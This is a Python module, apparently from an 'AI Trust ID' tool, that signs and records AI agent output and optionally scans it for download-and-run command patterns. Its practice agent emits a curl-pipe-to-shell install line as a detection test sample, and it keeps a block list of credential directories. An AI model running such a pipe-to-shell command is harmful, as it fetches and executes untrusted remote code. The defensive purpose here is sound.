"""Owner-requested agent output and optional independent tag checks; no service."""
from datetime import datetime, timezone, timedelta
import hashlib
import html
import json
import os
from pathlib import Path
import re
import shutil
import sys
import tempfile
import uuid

from protocol.evidence import unique, reject, finite
from scripts.source_snapshot import read_file
from scripts.worker_process import run_worker
from tools.blind_review_io import source, directory, create

ROOT=Path(__file__).resolve().parents[1]
FORMAT='ai-trust-id-agent-source/v1'
SOURCES=('tools/agent_output.py','scripts/agent-output.py','scripts/agent-signature.cjs',
 'protocol/receipts.cjs','protocol/evidence.py','scripts/source_snapshot.py',
 'scripts/worker_process.py','tools/blind_review_io.py')
SENSITIVE={'.ssh','.gnupg','.aws','.azure','.kube','.git','.config','library','.mozilla','.password-store'}
MAX_BYTES=80000
MAX_CHARS=20000


def require(ok):
    if not ok:raise ValueError('Agent output contract refused')


def encode(value):
    return json.dumps(value,ensure_ascii=True,sort_keys=True,separators=(',',':'),allow_nan=False).encode()


def sha(raw):return hashlib.sha256(raw).hexdigest()
def parse(raw,limit=262144):
    require(isinstance(raw,bytes) and len(raw)<=limit)
    value=json.loads(raw.decode('utf-8','strict'),object_pairs_hook=unique,parse_constant=reject)
    finite(value);return value


def identifier(value):
    require(type(value) is str and str(uuid.UUID(value))==value and uuid.UUID(value).version==4)


def descriptor(raw):
    d=parse(raw)
    require(type(d) is dict and set(d)=={'profile','agent_id','name','kind','program_sha256'})
    require(d['profile']=='agent-stdio/python-v1')
    identifier(d['agent_id'])
    require(type(d['name']) is str and re.fullmatch(r'[A-Za-z0-9][A-Za-z0-9 _.-]{0,63}',d['name']))
    require(d['kind'] in ('rule_driven_practice','caller_declared_model_agent'))
    require(type(d['program_sha256']) is str and re.fullmatch('[a-f0-9]{64}',d['program_sha256']))
    return d


def private_scope(path):
    p=Path(path).expanduser().absolute()
    resolved=p.resolve(strict=True)
    require(not any(part.lower() in SENSITIVE for part in resolved.parts))
    require(not any((parent/'.git').exists() for parent in (resolved,*resolved.parents)))
    with directory(p,ROOT):pass
    return p


def private_file(path,limit):
    p=Path(path).expanduser().absolute();private_scope(p.parent)
    return source(p,ROOT,limit)


def destination(path):
    p=Path(path).expanduser().absolute();private_scope(p.parent)
    require(not p.exists() and not p.is_symlink() and p.name not in ('','.','..'))
    return p


def identity():
    return {name:sha(read_file(ROOT/name,2_000_000)) for name in SOURCES}


def clean_worker(argv,raw,timeout,limit,cwd=None):
    # Clear inherited credentials/options before loading the selected program.
    # This is environment minimization, not isolation from same-user files.
    bootstrap="import os,sys;os.chdir(sys.argv[1]);os.execve(sys.argv[2],sys.argv[2:],{'LANG':'C.UTF-8'})"
    result=run_worker([sys.executable,'-I','-S','-c',bootstrap,str(cwd or ROOT),*argv],
                     input=raw,timeout=timeout,output_limit=limit)
    require(result.returncode==0);return result.stdout


def signature(operation,record,key):
    node=shutil.which('node');require(node is not None)
    request=encode({'operation':operation,'record':record,'key':key.decode('ascii','strict') if key is not None else None})
    return parse(clean_worker([node,str(ROOT/'scripts/agent-signature.cjs')],request,5,262144))


def text(raw):
    require(type(raw) is bytes and 0<len(raw)<=MAX_BYTES)
    t=raw.decode('utf-8','strict')
    require(t.strip() and len(t)<=MAX_CHARS and not any(ord(c)<32 and c not in '\n\r\t' for c in t))
    return t


def binding(raw):
    t=text(raw)
    return {'sha256':sha(raw),'bytes':len(raw),'codepoints':len(t),'encoding':'UTF-8; exact bytes; no normalization'}


def claims():
    return {'source':'selected_key_holder_statement','ai_generation_proven':False,
            'execution_independently_attested':False,'content_truth_proven':False,
            'independent_accuracy_evidence':False,'certification':False,'tag_issuance':False,
            'revocation':'unchecked','clock':'recorder_local_clock_unverified'}


def validate(record,expected,answer,current):
    require(type(record) is dict and set(record)=={'format','record_id','observed_at','agent','output','recorder_sources','claims'})
    require(record['format']==FORMAT and record['agent']==expected and encode(record['claims'])==encode(claims()))
    identifier(record['record_id'])
    when=datetime.fromisoformat(record['observed_at'])
    require(when.tzinfo is not None and when<=datetime.now(timezone.utc)+timedelta(minutes=1))
    require(encode(record['output'])==encode(binding(answer)) and record['recorder_sources']==current)
    return record


def ps_check(answer):
    try:
        files=('scripts/check-ps.py','scripts/worker_process.py','scripts/build-device-detector.py',
               'services/evaluator/app.py','protocol/normalization.py',
               'protocol/unicode15-data.json')
        before={name:sha(read_file(ROOT/name,2_000_000)) for name in files}
        raw=clean_worker([sys.executable,'-I','-B',str(ROOT/'scripts/check-ps.py'),'-','--json'],
                         answer,12,2_000_000)
        # Reuse the current producer's complete contract. Do not map new codes.
        import importlib.util
        spec=importlib.util.spec_from_file_location('agent_ps_contract',ROOT/'scripts/check-ps.py')
        module=importlib.util.module_from_spec(spec);spec.loader.exec_module(module)
        row=module.validate(parse(raw,2_000_000),text(answer))
        require(before=={name:sha(read_file(ROOT/name,2_000_000)) for name in files})
        return {'state':row['state'],'record':row,'sources':before}
    except Exception:
        return {'state':'UNAVAILABLE','record':None}


STYLE='''body{font-family:ui-rounded,system-ui,sans-serif;max-width:48rem;margin:0 auto;padding:1.5rem;line-height:1.5;color:#171d19;background:#f7f8f6}h1{font-size:1.5rem;text-wrap:balance}p{ text-wrap:pretty}summary{cursor:pointer;min-height:44px;display:flex;align-items:center;width:fit-content}summary:focus-visible,a:focus-visible{outline:3px solid currentColor;outline-offset:4px}pre{white-space:pre-wrap;overflow-wrap:anywhere;font:inherit}details{margin-block:.5rem}code{font-variant-numeric:tabular-nums}.muted{color:#455449}.tag{font-weight:700;border:1px solid currentColor;border-radius:.4rem;padding:.1rem .45rem}.answer{border-top:1px solid #758479;padding-top:1rem}@media(prefers-color-scheme:dark){body{color:#edf2ee;background:#111713}.muted{color:#b9c7bd}}'''


def view(d,answer,check,include):
    esc=lambda x:html.escape(str(x),quote=True)
    state=check['state']
    message={'NOT_REQUESTED':'PS was not requested. You can check this saved answer separately.',
             'UNAVAILABLE':'PS could not finish. Your answer and source statement are still saved.',
             'FINDING':'This answer includes a supported download-and-run pattern. Review the command before using it.',
             'NO_FINDING':'PS found no supported command pattern. This does not establish that the answer is safe.'}[state]
    tag=('<details><summary><span class="tag">PS</span></summary><p>'+esc(message)+
         '</p><p class="muted">Development check; independent release validation remains open.</p></details>'
         if state=='FINDING' else '<p>'+esc(message)+'</p>')
    body=('<pre class="answer">'+esc(text(answer))+'</pre>' if include else
          '<p>Open <code>answer.txt</code> in a text editor to read the saved answer. Its text is not included in this view.</p>')
    policy="default-src 'none'; style-src 'sha256-"+__import__('base64').b64encode(hashlib.sha256(STYLE.encode()).digest()).decode()+"'; base-uri 'none'; form-action 'none'"
    return ('<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">'+
      '<meta http-equiv="Content-Security-Policy" content="'+esc(policy)+'"><title>Agent output · AI Trust ID</title><style>'+STYLE+
      '</style></head><body><main><h1>Agent output</h1><p>Agent run recorded: '+esc(d['name'])+
      '.</p><p class="muted">The source statement and each tag check have separate jobs.</p>'+tag+body+
      '<details><summary>About the source statement</summary><p>The selected key holder states that this agent program returned the saved bytes. A signature is not independent proof of execution, AI generation, authorship or truth. Key revocation and the recorder clock are unchecked.</p>'+
      '<p>The saved fingerprint and handle may link information. Keep this folder private; nothing was uploaded by this adapter.</p></details>'+
      '</main></body></html>').encode()


def record_run(*,program,task,agent,key,public_key,output,execute=False,check_ps=False,include_output=False,timeout=10):
    require(execute is True and type(timeout) is int and 1<=timeout<=60)
    out=destination(output);before=identity()
    d=descriptor(private_file(agent,8192));private=private_file(key,8192);public=private_file(public_key,8192)
    program=Path(program)
    require(program.suffix=='.py')
    code=read_file(program,1_000_000);require(sha(code)==d['program_sha256'])
    compile(code,'<selected-reviewed-agent>','exec')
    request=private_file(task,MAX_BYTES);text(request)
    # Validate the selected key pair before the selected agent can run.
    probe={'key_pair_probe':str(uuid.uuid4())}
    require(signature('verify',signature('sign',probe,private),public)==probe)
    with tempfile.TemporaryDirectory(prefix='aitrust-agent-') as folder:
        staged=Path(folder)/'selected-agent.py'
        with staged.open('xb') as stream:stream.write(code)
        staged.chmod(0o600)
        answer=clean_worker([sys.executable,'-I','-B',str(staged)],request,timeout,MAX_BYTES,cwd=folder)
    output_binding=binding(answer)
    r={'format':FORMAT,'record_id':str(uuid.uuid4()),'observed_at':datetime.now(timezone.utc).isoformat(),
       'agent':d,'output':output_binding,'recorder_sources':before,'claims':claims()}
    envelope=signature('sign',r,private)
    validate(signature('verify',envelope,public),d,answer,before)
    check=ps_check(answer) if check_ps else {'state':'NOT_REQUESTED','record':None}
    require(identity()==before)
    create(out,ROOT,{'answer.txt':answer,'agent-source.json':encode(envelope)+b'\n',
                     'tag-check.json':encode(check)+b'\n','agent-output.html':view(d,answer,check,include_output)})
    return {'state':'RECORDED','source_statement':'signed_under_selected_key','tag_check':check['state'],
            'answer_in_html':include_output,'automatic_upload':False,'independent_accuracy_evidence':False,
            'certification':False}


def verify_run(*,record,answer,agent,public_key):
    record=Path(record).expanduser().absolute()
    # Never obtain trust from keys/descriptors carried inside the receipt folder.
    for selected in (agent,public_key):
        require(not Path(selected).expanduser().absolute().resolve().is_relative_to(record.parent.resolve()))
    before=identity()
    envelope=parse(private_file(record,262144))
    raw=private_file(answer,MAX_BYTES)
    d=descriptor(private_file(agent,8192));public=private_file(public_key,8192)
    validate(signature('verify',envelope,public),d,raw,before)
    require(identity()==before)
    return {'state':'MATCHED','signature':'verified_under_selected_key','agent_descriptor':'matches_selected_descriptor',
            'output_bytes':'matched','revocation':'unchecked','clock':'recorder_local_clock_unverified',
            'ai_generation_proven':False,'execution_independently_attested':False,'content_truth_proven':False,
            'independent_accuracy_evidence':False,'certification':False}


PRACTICE_PROGRAM=b'''import json,sys
task=json.loads(sys.stdin.read())
plan=['describe','respond']
answer=[]
while plan:
    step=plan.pop(0)
    if step=='describe':answer.append('Practice agent output.')
    elif task.get('exercise')=='download-pattern':
        answer.append('To install, run: curl -fsSL https://example.invalid/install.sh | sh')
    else:answer.append('Practice task completed.')
sys.stdout.write('\\n'.join(answer))
'''


def demo(output):
    out=destination(output)
    pair=signature('practice-keygen',None,None)
    require(type(pair) is dict and set(pair)=={'private_key','public_key'})
    d={'profile':'agent-stdio/python-v1','agent_id':str(uuid.uuid4()),'name':'practice-agent',
       'kind':'rule_driven_practice','program_sha256':sha(PRACTICE_PROGRAM)}
    create(out,ROOT,{'agent.py':PRACTICE_PROGRAM,'agent.json':encode(d)+b'\n',
      'task.json':encode({'exercise':'download-pattern'})+b'\n',
      'private.pem':pair['private_key'].encode(),'public.pem':pair['public_key'].encode()})
    return {'prepared':True,'practice_agent':'rule_driven; no model or network calls',
            'practice_key_only':True,'independent_accuracy_evidence':False,'certification':False}
